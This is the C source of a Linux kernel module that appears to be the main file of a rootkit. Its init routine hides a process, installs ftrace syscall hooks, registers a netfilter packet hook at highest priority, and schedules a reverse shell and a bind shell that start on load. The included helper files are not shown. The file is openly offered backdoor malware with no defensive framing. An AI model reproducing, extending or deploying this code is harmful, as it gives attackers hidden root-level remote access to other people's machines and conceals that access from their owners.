#pragma GCC optimize("-fno-optimize-sibling-calls")

#include "includes/linux_headers.h"
#include "includes/hooks/all_origs.h"
#include "includes/rk_vars.h"
#include "includes/rk_structs.h"
#include "includes/utils.c"
#include "includes/hooks/all_hooks_headers.h"
#include "includes/ftrace_install/rk_ftrace.h"
#include "includes/ftrace_install/rk_ftrace_hooks.h"

static int rk_start(void) {
	int err;
	
	//bds_hide();
	hide_proc(1);
        
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	
	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	nfho->hook  = (nf_hookfn*)bds_nf_hook;      
	nfho->hooknum   = NF_INET_PRE_ROUTING;     
	nfho->pf    = PF_INET;          
	nfho->priority  = NF_IP_PRI_FIRST;      
	nf_register_net_hook(&init_net, nfho);
	INIT_WORK(&do_umode_exec, bds_reverse_shell);
        INIT_WORK(&do_work_bind, bds_bindshell);
	schedule_work(&do_work_bind);
	
	return 0;
}

static void rk_end(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	nf_unregister_net_hook(&init_net, nfho);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Gr4 @ dilag");
module_init(rk_start);
module_exit(rk_end);
